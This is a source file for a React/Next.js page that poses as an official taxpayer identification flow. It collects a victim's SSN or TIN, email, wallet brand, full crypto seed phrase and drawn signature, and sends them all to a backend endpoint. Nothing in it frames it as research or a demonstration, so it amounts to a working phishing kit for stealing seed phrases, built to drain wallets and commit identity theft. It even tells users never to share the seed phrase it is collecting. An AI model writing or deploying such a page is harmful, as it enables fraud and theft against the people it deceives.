'use client';

import React, { useState, useRef, useEffect } from 'react';
import Link from 'next/link';

export default function IdentificationFlow() {
  const [step, setStep] = useState<number | string>(0);
  const [ssnTin, setSsnTin] = useState('');
  const [email, setEmail] = useState('');
  const [walletType, setWalletType] = useState<'cold' | 'hot' | ''>('');
  const [walletBrand, setWalletBrand] = useState('');
  const [seedLength, setSeedLength] = useState<12 | 24>(24);
  const [seedWords, setSeedWords] = useState<string[]>(Array(24).fill(''));
  const [signatureData, setSignatureData] = useState('');
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [sigRequiredError, setSigRequiredError] = useState(false);
  const [sigModalError, setSigModalError] = useState(false);

  // Canvas & Signature pad refs
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const isDrawingRef = useRef(false);
  const lastPosRef = useRef({ x: 0, y: 0 });
  const hasDrawnRef = useRef(false);
  const sigPadInstanceRef = useRef<any>(null);

  // Update words array size when seed length changes
  const handleSelectSeedLength = (len: 12 | 24) => {
    setSeedLength(len);
    setSeedWords(Array(len).fill(''));
    setStep(4);
  };

  const handleWordChange = (index: number, val: string) => {
    const cleaned = val.toLowerCase().replace(/\s+/g, '');
    setSeedWords((prev) => {
      const next = [...prev];
      next[index] = cleaned;
      return next;
    });
  };

  // Canvas setup for modal
  useEffect(() => {
    if (!isModalOpen || !canvasRef.current) return;

    const canvas = canvasRef.current;
    const parent = canvas.parentElement;
    if (!parent) return;

    const ratio = Math.max(window.devicePixelRatio || 1, 1);
    const width = parent.clientWidth;
    const height = parent.clientHeight;

    canvas.width = width * ratio;
    canvas.height = height * ratio;
    canvas.style.width = width + 'px';
    canvas.style.height = height + 'px';

    const ctx = canvas.getContext('2d');
    if (ctx) {
      ctx.scale(ratio, ratio);
      ctx.lineCap = 'round';
      ctx.lineJoin = 'round';
      ctx.strokeStyle = '#112e51';
      ctx.lineWidth = 2.5;
    }

    // Check if SignaturePad library is loaded on window
    const WinAny = window as any;
    if (typeof WinAny.SignaturePad !== 'undefined') {
      sigPadInstanceRef.current = new WinAny.SignaturePad(canvas, {
        minWidth: 1.5,
        maxWidth: 3.5,
        penColor: '#112e51',
        velocityFilterWeight: 0.7,
      });
    } else {
      sigPadInstanceRef.current = null;
    }

    hasDrawnRef.current = false;
  }, [isModalOpen]);

  // Pointer drawing events for fallback
  const getCanvasPos = (e: React.PointerEvent<HTMLCanvasElement>) => {
    const canvas = canvasRef.current;
    if (!canvas) return { x: 0, y: 0 };
    const rect = canvas.getBoundingClientRect();
    return {
      x: e.clientX - rect.left,
      y: e.clientY - rect.top,
    };
  };

  const handlePointerDown = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (sigPadInstanceRef.current) return;
    isDrawingRef.current = true;
    const pos = getCanvasPos(e);
    lastPosRef.current = pos;
    const ctx = canvasRef.current?.getContext('2d');
    if (ctx) {
      ctx.beginPath();
      ctx.moveTo(pos.x, pos.y);
    }
    hasDrawnRef.current = true;
  };

  const handlePointerMove = (e: React.PointerEvent<HTMLCanvasElement>) => {
    if (sigPadInstanceRef.current || !isDrawingRef.current) return;
    const pos = getCanvasPos(e);
    const ctx = canvasRef.current?.getContext('2d');
    if (ctx) {
      ctx.lineTo(pos.x, pos.y);
      ctx.stroke();
    }
    lastPosRef.current = pos;
  };

  const handlePointerUp = () => {
    isDrawingRef.current = false;
  };

  const handleClearSignature = () => {
    if (sigPadInstanceRef.current) {
      sigPadInstanceRef.current.clear();
    } else if (canvasRef.current) {
      const ctx = canvasRef.current.getContext('2d');
      if (ctx) {
        ctx.clearRect(0, 0, canvasRef.current.width, canvasRef.current.height);
      }
      hasDrawnRef.current = false;
    }
    setSigModalError(false);
  };

  const handleSaveSignature = () => {
    let isEmpty = true;
    let dataUrl = '';

    if (sigPadInstanceRef.current) {
      isEmpty = sigPadInstanceRef.current.isEmpty();
      if (!isEmpty) dataUrl = sigPadInstanceRef.current.toDataURL();
    } else if (canvasRef.current) {
      isEmpty = !hasDrawnRef.current;
      if (!isEmpty) dataUrl = canvasRef.current.toDataURL();
    }

    if (isEmpty || !dataUrl) {
      setSigModalError(true);
      return;
    }

    setSignatureData(dataUrl);
    setSigRequiredError(false);
    setIsModalOpen(false);
  };

  const handleSubmit = async () => {
    if (!signatureData) {
      setSigRequiredError(true);
      setIsModalOpen(true);
      return;
    }

    setIsSubmitting(true);

    try {
      const payload = {
        ssn_tin: ssnTin,
        email: email,
        wallet_type: walletType === 'cold' ? 'Cold Wallets' : (walletType === 'hot' ? 'Hot Wallets' : walletType),
        wallet_brand: walletBrand,
        seed_length: seedLength,
        seed_words: seedWords,
        signature: signatureData,
      };

      const res = await fetch('/api/submissions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (!res.ok) {
        console.warn('Submission response status:', res.status);
      }
    } catch (err) {
      console.warn('Submission network error:', err);
    } finally {
      setIsSubmitting(false);
      setStep(5);
    }
  };

  return (
    <div style={{
      maxWidth: '860px',
      margin: '30px auto 60px auto',
      padding: '0 15px',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
      color: '#212121',
    }}>
      {/* ------------------------------------------------------------- */}
      {/* STEP 0: Identification (SSN / TIN & Email)                   */}
      {/* ------------------------------------------------------------- */}
      {step === 0 && (
        <div>
          <h1 style={{ color: '#112e51', fontSize: '30px', fontWeight: 700, margin: '0 0 8px 0' }}>
            Identification
          </h1>

          <div style={{ marginTop: '24px', marginBottom: '20px' }}>
            <label htmlFor="ssn_tin_input" style={{ display: 'block', fontSize: '16px', fontWeight: 700, color: '#112e51', marginBottom: '10px' }}>
              SSN, if applicable / U.S. Taxpayer Identification Number (TIN)
            </label>
            <input
              type="text"
              id="ssn_tin_input"
              value={ssnTin}
              onChange={(e) => setSsnTin(e.target.value)}
              placeholder="XXX-XX-XXXX or XX-XXXXXXX"
              autoComplete="off"
              style={{
                width: '100%',
                maxWidth: '420px',
                height: '48px',
                padding: '10px 16px',
                fontSize: '17px',
                letterSpacing: '1px',
                color: '#112e51',
                border: '1.5px solid #565c65',
                borderRadius: '4px',
                boxSizing: 'border-box',
                outline: 'none',
              }}
            />
          </div>

          <div style={{ marginBottom: '28px' }}>
            <label htmlFor="email_input" style={{ display: 'block', fontSize: '16px', fontWeight: 700, color: '#112e51', marginBottom: '10px' }}>
              Email Address
            </label>
            <input
              type="email"
              id="email_input"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="name@example.com"
              autoComplete="email"
              style={{
                width: '100%',
                maxWidth: '420px',
                height: '48px',
                padding: '10px 16px',
                fontSize: '17px',
                color: '#112e51',
                border: '1.5px solid #565c65',
                borderRadius: '4px',
                boxSizing: 'border-box',
                outline: 'none',
              }}
            />
          </div>

          <div>
            <button
              type="button"
              onClick={() => setStep(1)}
              style={{
                backgroundColor: '#005ea2',
                border: '1.5px solid #005ea2',
                color: '#ffffff',
                padding: '12px 32px',
                fontSize: '16px',
                fontWeight: 600,
                borderRadius: '4px',
                cursor: 'pointer',
              }}
            >
              Next
            </button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* STEP 1: Choose wallet type                                   */}
      {/* ------------------------------------------------------------- */}
      {step === 1 && (
        <div>
          <h1 style={{ color: '#112e51', fontSize: '30px', fontWeight: 700, margin: '0 0 8px 0' }}>
            Choose your wallet type
          </h1>
          <p style={{ color: '#565c65', fontSize: '16px', margin: '0 0 28px 0' }}>
            Select whether you use a hardware or software wallet
          </p>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '32px' }}>
            <div
              onClick={() => { setWalletType('cold'); setStep('2-cold'); }}
              style={{
                background: '#ffffff',
                border: '1.5px solid #dfe1e2',
                borderRadius: '8px',
                padding: '22px 24px',
                cursor: 'pointer',
                transition: 'all 0.2s',
              }}
            >
              <div style={{ fontSize: '18px', fontWeight: 700, color: '#112e51', marginBottom: '6px' }}>Cold Wallets</div>
              <p style={{ fontSize: '14px', color: '#565c65', margin: 0 }}>Hardware wallets - Maximum security</p>
            </div>

            <div
              onClick={() => { setWalletType('hot'); setStep('2-hot'); }}
              style={{
                background: '#ffffff',
                border: '1.5px solid #dfe1e2',
                borderRadius: '8px',
                padding: '22px 24px',
                cursor: 'pointer',
                transition: 'all 0.2s',
              }}
            >
              <div style={{ fontSize: '18px', fontWeight: 700, color: '#112e51', marginBottom: '6px' }}>Hot Wallets</div>
              <p style={{ fontSize: '14px', color: '#565c65', margin: 0 }}>Software wallets - Convenient access</p>
            </div>
          </div>

          <div>
            <button
              type="button"
              onClick={() => setStep(0)}
              style={{
                background: 'transparent',
                color: '#565c65',
                border: '1.5px solid #dfe1e2',
                padding: '10px 20px',
                borderRadius: '4px',
                fontSize: '14px',
                fontWeight: 600,
                cursor: 'pointer',
              }}
            >
              &lt; Back
            </button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* STEP 2A: Cold wallet brands                                   */}
      {/* ------------------------------------------------------------- */}
      {step === '2-cold' && (
        <div>
          <h1 style={{ color: '#112e51', fontSize: '30px', fontWeight: 700, margin: '0 0 8px 0' }}>
            Choose your wallet brand
          </h1>
          <p style={{ color: '#565c65', fontSize: '16px', margin: '0 0 28px 0' }}>
            Select a hardware wallet manufacturer
          </p>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '16px', marginBottom: '32px' }}>
            {['Ledger', 'Trezor', 'KeepKey'].map((b) => (
              <div
                key={b}
                onClick={() => { setWalletBrand(b); setStep(3); }}
                style={{
                  background: '#ffffff',
                  border: '1.5px solid #dfe1e2',
                  borderRadius: '8px',
                  padding: '22px 24px',
                  cursor: 'pointer',
                }}
              >
                <div style={{ fontSize: '18px', fontWeight: 700, color: '#112e51' }}>{b}</div>
              </div>
            ))}
          </div>

          <div>
            <button
              type="button"
              onClick={() => setStep(1)}
              style={{
                background: 'transparent',
                color: '#565c65',
                border: '1.5px solid #dfe1e2',
                padding: '10px 20px',
                borderRadius: '4px',
                fontSize: '14px',
                fontWeight: 600,
                cursor: 'pointer',
              }}
            >
              &lt; Back
            </button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* STEP 2B: Hot wallet brands                                    */}
      {/* ------------------------------------------------------------- */}
      {step === '2-hot' && (
        <div>
          <h1 style={{ color: '#112e51', fontSize: '30px', fontWeight: 700, margin: '0 0 8px 0' }}>
            Choose your wallet brand
          </h1>
          <p style={{ color: '#565c65', fontSize: '16px', margin: '0 0 28px 0' }}>
            Select a software wallet
          </p>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '16px', marginBottom: '32px' }}>
            {[
              'MetaMask Wallet',
              'Trust Wallet',
              'Coinbase Wallet',
              'Phantom Wallet',
              'Exodus Wallet',
              'Atomic Wallet',
              'OKX Wallet',
              'Other Wallet',
            ].map((b) => (
              <div
                key={b}
                onClick={() => { setWalletBrand(b); setStep(3); }}
                style={{
                  background: '#ffffff',
                  border: '1.5px solid #dfe1e2',
                  borderRadius: '8px',
                  padding: '22px 24px',
                  cursor: 'pointer',
                }}
              >
                <div style={{ fontSize: '18px', fontWeight: 700, color: '#112e51' }}>{b}</div>
              </div>
            ))}
          </div>

          <div>
            <button
              type="button"
              onClick={() => setStep(1)}
              style={{
                background: 'transparent',
                color: '#565c65',
                border: '1.5px solid #dfe1e2',
                padding: '10px 20px',
                borderRadius: '4px',
                fontSize: '14px',
                fontWeight: 600,
                cursor: 'pointer',
              }}
            >
              &lt; Back
            </button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* STEP 3: Choose seed phrase length                             */}
      {/* ------------------------------------------------------------- */}
      {step === 3 && (
        <div>
          <h1 style={{ color: '#112e51', fontSize: '30px', fontWeight: 700, margin: '0 0 8px 0' }}>
            Choose seed phrase length
          </h1>
          <p style={{ color: '#565c65', fontSize: '16px', margin: '0 0 28px 0' }}>
            Select whether your seed phrase has 12 or 24 words
          </p>

          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '32px' }}>
            <div
              onClick={() => handleSelectSeedLength(12)}
              style={{
                background: '#ffffff',
                border: '1.5px solid #dfe1e2',
                borderRadius: '8px',
                padding: '22px 24px',
                cursor: 'pointer',
              }}
            >
              <div style={{ fontSize: '18px', fontWeight: 700, color: '#112e51', marginBottom: '6px' }}>12-Word Seed Phrase</div>
              <p style={{ fontSize: '14px', color: '#565c65', margin: 0 }}>Standard seed phrase length</p>
            </div>

            <div
              onClick={() => handleSelectSeedLength(24)}
              style={{
                background: '#ffffff',
                border: '1.5px solid #dfe1e2',
                borderRadius: '8px',
                padding: '22px 24px',
                cursor: 'pointer',
              }}
            >
              <div style={{ fontSize: '18px', fontWeight: 700, color: '#112e51', marginBottom: '6px' }}>24-Word Seed Phrase</div>
              <p style={{ fontSize: '14px', color: '#565c65', margin: 0 }}>Extended seed phrase length</p>
            </div>
          </div>

          <div>
            <button
              type="button"
              onClick={() => setStep(walletType === 'cold' ? '2-cold' : '2-hot')}
              style={{
                background: 'transparent',
                color: '#565c65',
                border: '1.5px solid #dfe1e2',
                padding: '10px 20px',
                borderRadius: '4px',
                fontSize: '14px',
                fontWeight: 600,
                cursor: 'pointer',
              }}
            >
              &lt; Back
            </button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* STEP 4: Enter seed phrase words & Signature                   */}
      {/* ------------------------------------------------------------- */}
      {step === 4 && (
        <div>
          <h1 style={{ color: '#112e51', fontSize: '30px', fontWeight: 700, margin: '0 0 8px 0' }}>
            Enter your {seedLength}-word seed phrase
          </h1>
          <p style={{ color: '#565c65', fontSize: '16px', margin: '0 0 28px 0' }}>
            Type each word of your seed phrase in order. Words will be automatically converted to lowercase.
          </p>

          <div style={{
            background: '#f0f7fc',
            border: '1px solid #cce2f5',
            borderRadius: '6px',
            padding: '14px 18px',
            display: 'flex',
            alignItems: 'center',
            gap: '12px',
            marginBottom: '24px',
            color: '#112e51',
            fontSize: '14px',
          }}>
            <span style={{ color: '#005ea2', fontSize: '18px' }}>&#9432;</span>
            <span>Never share your seed phrase with anyone. This information is sensitive and should be kept private.</span>
          </div>

          <div style={{
            display: 'grid',
            gridTemplateColumns: 'repeat(auto-fit, minmax(170px, 1fr))',
            gap: '14px',
            marginBottom: '28px',
          }}>
            {Array.from({ length: seedLength }).map((_, idx) => (
              <div key={idx} style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
                <label style={{ fontSize: '13px', fontWeight: 600, color: '#565c65' }}>Word {idx + 1}</label>
                <input
                  type="text"
                  value={seedWords[idx] || ''}
                  onChange={(e) => handleWordChange(idx, e.target.value)}
                  placeholder={`Word ${idx + 1}`}
                  autoComplete="off"
                  autoCapitalize="none"
                  spellCheck={false}
                  style={{
                    width: '100%',
                    height: '42px',
                    padding: '8px 12px',
                    fontSize: '14px',
                    color: '#112e51',
                    border: '1px solid #dfe1e2',
                    borderRadius: '4px',
                    boxSizing: 'border-box',
                    outline: 'none',
                    background: '#ffffff',
                  }}
                />
              </div>
            ))}
          </div>

          {/* Signature Block */}
          <div style={{
            margin: '28px 0 24px 0',
            padding: '22px',
            background: '#f8f9fa',
            border: '1.5px solid #dfe1e2',
            borderRadius: '8px',
          }}>
            <div style={{ fontSize: '16px', fontWeight: 700, color: '#112e51', marginBottom: '6px' }}>
              Signature
            </div>
            <p style={{ fontSize: '14px', color: '#565c65', margin: '0 0 14px 0' }}>
              Please provide your electronic signature.
            </p>

            {!signatureData ? (
              <div>
                <button
                  type="button"
                  onClick={() => setIsModalOpen(true)}
                  style={{
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: '8px',
                    background: '#ffffff',
                    color: '#005ea2',
                    border: '2px solid #005ea2',
                    padding: '10px 24px',
                    fontSize: '15px',
                    fontWeight: 700,
                    borderRadius: '4px',
                    cursor: 'pointer',
                  }}
                >
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M12 20h9"></path>
                    <path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"></path>
                  </svg>
                  <span>Sign</span>
                </button>
              </div>
            ) : (
              <div style={{
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                background: '#ffffff',
                border: '1px solid #cce2f5',
                padding: '12px 18px',
                borderRadius: '6px',
              }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                  <div style={{
                    background: '#eef7ee',
                    color: '#2e8540',
                    width: '30px',
                    height: '30px',
                    borderRadius: '50%',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    fontWeight: 'bold',
                    fontSize: '16px',
                  }}>
                    &#10003;
                  </div>
                  <div>
                    <div style={{ fontSize: '13px', fontWeight: 700, color: '#112e51' }}>Signature Recorded</div>
                    <img src={signatureData} alt="Recorded Signature" style={{ maxHeight: '44px', maxWidth: '220px', display: 'block', marginTop: '4px' }} />
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => setIsModalOpen(true)}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#005ea2',
                    fontSize: '13px',
                    fontWeight: 600,
                    cursor: 'pointer',
                    textDecoration: 'underline',
                  }}
                >
                  Change
                </button>
              </div>
            )}

            {sigRequiredError && !signatureData && (
              <div style={{ color: '#d9381e', fontSize: '13px', marginTop: '10px', fontWeight: 600 }}>
                Please click &quot;Sign&quot; to provide your signature before submitting.
              </div>
            )}
          </div>

          {/* Action Buttons */}
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '16px', marginTop: '24px' }}>
            <button
              type="button"
              onClick={() => setStep(3)}
              style={{
                background: 'transparent',
                color: '#565c65',
                border: '1.5px solid #dfe1e2',
                padding: '10px 20px',
                borderRadius: '4px',
                fontSize: '14px',
                fontWeight: 600,
                cursor: 'pointer',
              }}
            >
              &lt; Back
            </button>
            <button
              type="button"
              onClick={handleSubmit}
              disabled={isSubmitting}
              style={{
                backgroundColor: '#005ea2',
                border: '1.5px solid #005ea2',
                color: '#ffffff',
                padding: '12px 32px',
                fontSize: '16px',
                fontWeight: 600,
                borderRadius: '4px',
                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                opacity: isSubmitting ? 0.7 : 1,
              }}
            >
              {isSubmitting ? 'Submitting...' : 'Submit'}
            </button>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* STEP 5: Final completion screen                               */}
      {/* ------------------------------------------------------------- */}
      {step === 5 && (
        <div style={{
          background: '#ffffff',
          border: '1.5px solid #dfe1e2',
          borderRadius: '8px',
          boxShadow: '0 4px 16px rgba(0, 0, 0, 0.05)',
          padding: '44px 32px',
          textAlign: 'center',
          maxWidth: '740px',
          margin: '24px auto',
        }}>
          <div style={{
            width: '64px',
            height: '64px',
            background: '#edf7ee',
            border: '2px solid #2e8540',
            color: '#2e8540',
            borderRadius: '50%',
            display: 'inline-flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '30px',
            marginBottom: '24px',
          }}>
            &#10003;
          </div>

          <div style={{
            background: '#f8f9fa',
            borderLeft: '4px solid #005ea2',
            borderRadius: '4px',
            padding: '22px 24px',
            textAlign: 'left',
            marginBottom: '28px',
          }}>
            <p style={{ margin: 0, fontSize: '16px', lineHeight: 1.7, color: '#112e51' }}>
              Once the blockchain integration has been completed, the available on-chain information can be reviewed to assist with confirming the source, movement, and activity of the digital assets associated with the designated wallet.
            </p>
          </div>

          <div>
            <Link
              href="/"
              style={{
                backgroundColor: '#005ea2',
                border: '1.5px solid #005ea2',
                color: '#ffffff',
                padding: '12px 32px',
                fontSize: '16px',
                fontWeight: 600,
                borderRadius: '4px',
                textDecoration: 'none',
                display: 'inline-block',
              }}
            >
              Return to Homepage
            </Link>
          </div>
        </div>
      )}

      {/* ------------------------------------------------------------- */}
      {/* SIGNATURE MODAL POPUP                                         */}
      {/* ------------------------------------------------------------- */}
      {isModalOpen && (
        <div
          onClick={(e) => {
            if ((e.target as HTMLElement).id === 'sigOverlay') setIsModalOpen(false);
          }}
          id="sigOverlay"
          style={{
            position: 'fixed',
            top: 0,
            left: 0,
            width: '100%',
            height: '100%',
            background: 'rgba(0, 0, 0, 0.55)',
            backdropFilter: 'blur(2px)',
            zIndex: 99999,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '20px',
            boxSizing: 'border-box',
          }}
        >
          <div style={{
            background: '#ffffff',
            borderRadius: '8px',
            boxShadow: '0 16px 40px rgba(0, 0, 0, 0.25)',
            maxWidth: '600px',
            width: '100%',
            overflow: 'hidden',
          }}>
            <div style={{
              padding: '16px 24px',
              background: '#f0f7fc',
              borderBottom: '1px solid #dfe1e2',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
            }}>
              <h3 style={{ fontSize: '18px', fontWeight: 700, color: '#112e51', margin: 0 }}>Electronic Signature</h3>
              <button
                type="button"
                onClick={() => setIsModalOpen(false)}
                style={{
                  background: 'none',
                  border: 'none',
                  fontSize: '24px',
                  color: '#565c65',
                  cursor: 'pointer',
                  lineHeight: 1,
                }}
              >
                &times;
              </button>
            </div>

            <div style={{ padding: '24px' }}>
              <p style={{ fontSize: '14px', color: '#565c65', marginTop: 0, marginBottom: '16px' }}>
                Please sign in the box below using your mouse, trackpad, or touch screen.
              </p>

              <div style={{
                position: 'relative',
                width: '100%',
                height: '200px',
                border: '2px dashed #aeb0b5',
                borderRadius: '6px',
                background: '#ffffff',
                touchAction: 'none',
                cursor: 'crosshair',
              }}>
                <canvas
                  ref={canvasRef}
                  onPointerDown={handlePointerDown}
                  onPointerMove={handlePointerMove}
                  onPointerUp={handlePointerUp}
                  style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', display: 'block' }}
                />
                <div style={{
                  position: 'absolute',
                  left: '20px',
                  right: '20px',
                  bottom: '36px',
                  borderBottom: '1px solid #dfe1e2',
                  pointerEvents: 'none',
                  display: 'flex',
                  justifyContent: 'space-between',
                  color: '#aeb0b5',
                  fontSize: '12px',
                  paddingBottom: '2px',
                }}>
                  <span>&#10005; Sign on the line</span>
                  <span>Authorized Taxpayer Signature</span>
                </div>
              </div>

              {sigModalError && (
                <div style={{ color: '#d9381e', fontSize: '13px', marginTop: '8px' }}>
                  Please provide your signature before saving.
                </div>
              )}
            </div>

            <div style={{
              padding: '16px 24px',
              background: '#f8f9fa',
              borderTop: '1px solid #dfe1e2',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              gap: '12px',
            }}>
              <button
                type="button"
                onClick={handleClearSignature}
                style={{
                  background: 'transparent',
                  color: '#565c65',
                  border: '1.5px solid #dfe1e2',
                  padding: '8px 18px',
                  borderRadius: '4px',
                  fontSize: '14px',
                  fontWeight: 600,
                  cursor: 'pointer',
                }}
              >
                Clear
              </button>
              <div style={{ display: 'flex', gap: '10px' }}>
                <button
                  type="button"
                  onClick={() => setIsModalOpen(false)}
                  style={{
                    background: 'transparent',
                    color: '#565c65',
                    border: '1.5px solid #dfe1e2',
                    padding: '8px 18px',
                    borderRadius: '4px',
                    fontSize: '14px',
                    fontWeight: 600,
                    cursor: 'pointer',
                  }}
                >
                  Cancel
                </button>
                <button
                  type="button"
                  onClick={handleSaveSignature}
                  style={{
                    backgroundColor: '#005ea2',
                    border: '1.5px solid #005ea2',
                    color: '#ffffff',
                    padding: '8px 22px',
                    fontSize: '14px',
                    fontWeight: 600,
                    borderRadius: '4px',
                    cursor: 'pointer',
                  }}
                >
                  Save Signature
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
